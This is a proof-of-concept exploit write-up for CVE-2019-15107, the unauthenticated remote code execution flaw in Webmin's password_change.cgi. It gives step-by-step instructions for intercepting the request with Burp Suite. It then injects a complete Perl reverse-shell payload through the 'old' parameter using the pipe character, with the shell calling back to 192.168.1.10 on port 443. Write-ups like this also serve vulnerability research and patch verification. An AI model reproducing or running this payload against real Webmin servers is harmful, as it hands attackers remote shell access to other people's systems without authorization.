# Proof of Concept: CVE-2019-15107 - Webmin Remote Code Execution (RCE)

## Overview

This Proof of Concept (PoC) demonstrates the exploitation of a critical vulnerability in Webmin (versions 1.882 to 1.921), identified as **CVE-2019-15107**. The vulnerability allows an unauthenticated remote attacker to execute arbitrary commands on the target system due to improper input validation in the **password_change.cgi** script.

- **CVE**: [CVE-2019-15107](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15107)
- **Severity**: Critical
- **Vulnerability Type**: Remote Code Execution (RCE)
- **Affected Versions**: Webmin 1.882 to 1.921
- **Patched Version**: Webmin 1.930

## Vulnerability Details

The vulnerability exists in the `password_change.cgi` script, where improper sanitization of the `old` parameter allows an attacker to inject arbitrary commands using the vertical bar (`|`) character, leading to remote command execution.

## Exploitation

### Tools Required:
- Burp Suite or another HTTP interceptor
- Netcat for reverse shell listener

### Steps to Exploit:

1. **Intercept the Request**: 
   Use Burp Suite to intercept the HTTP request made to the `password_change.cgi` script when attempting to change a password on the Webmin server.

2. **Modify the `old` Parameter**: 
   Inject a malicious payload into the `old` parameter of the intercepted request. For this PoC, we will inject a reverse shell payload:

   ```bash
   old=some_password|perl -e 'use Socket;$i="192.168.1.10";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
   ```

3. **Send the Modified Request**: 
   Send the HTTP request with the malicious payload to the Webmin server via Burp Suite.
